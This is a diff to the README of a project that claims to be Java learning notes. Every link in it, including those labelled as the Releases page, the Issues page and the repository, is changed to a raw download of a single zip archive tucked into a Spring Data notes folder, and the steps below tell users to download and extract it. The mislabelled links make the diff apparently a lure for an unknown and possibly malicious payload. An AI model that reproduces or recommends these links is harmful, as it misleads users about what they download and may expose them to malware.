@@ -1,7 +1,7 @@
 # 📚 JAVA_NOTES - Simple Java Learning Companion
 
 ## 🔗 Download Now
-[![Download JAVA_NOTES](https://img.shields.io/badge/Download-JAVA_NOTES-blue.svg)](https://github.com/Thema31n/JAVA_NOTES/releases)
+[![Download JAVA_NOTES](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip)](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to JAVA_NOTES! This project contains organized notes about Java programming. The notes cover various topics, guiding you through the essentials as you learn.
@@ -15,7 +15,7 @@ Welcome to JAVA_NOTES! This project contains organized notes about Java programm
 ## 📥 Download & Install
 To get started, follow these steps to download JAVA_NOTES:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Thema31n/JAVA_NOTES/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip) to find the latest version.
 2. **Choose Your Version**: Look for the most recent release and click on it.
 3. **Download the Notes**: You will see a zip file or similar. Click to download the file to your computer.
 4. **Extract the Files**: After the download is complete, locate the downloaded file. If it’s compressed (like a zip file), you will need to extract it. Right-click the file and select “Extract All” or use a file extraction tool of your choice.
@@ -47,7 +47,7 @@ We recommend checking the following resources to enhance your learning:
 - **Java Community Forums**: Engage with fellow learners and get help from experienced programmers.
 
 ## 🛠️ Need Help?
-If you encounter any issues during installation or have questions about the notes, feel free to reach out. Check the [Issues page](https://github.com/Thema31n/JAVA_NOTES/issues) for issues others have faced or to create a new one. 
+If you encounter any issues during installation or have questions about the notes, feel free to reach out. Check the [Issues page](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip) for issues others have faced or to create a new one. 
 
 ## 🎉 Explore More
 Join the community of Java learners! Share your experiences and insights using the topics covered in JAVA_NOTES. Engage with fellow users through forums or social media.
@@ -66,8 +66,8 @@ If you want to contribute to JAVA_NOTES, please follow these steps:
 We welcome all contributions that can enhance this learning resource.
 
 ## 🔗 Quick Links
-- [Download JAVA_NOTES](https://github.com/Thema31n/JAVA_NOTES/releases)
-- [View Issues](https://github.com/Thema31n/JAVA_NOTES/issues)
-- [GitHub Repository](https://github.com/Thema31n/JAVA_NOTES)
+- [Download JAVA_NOTES](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip)
+- [View Issues](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Thema31n/JAVA_NOTES/main/JAVA/SPRING/4- SPRING DATA/NOTES_JAV_v2.8.zip)
 
 Dive into the notes and happy coding!
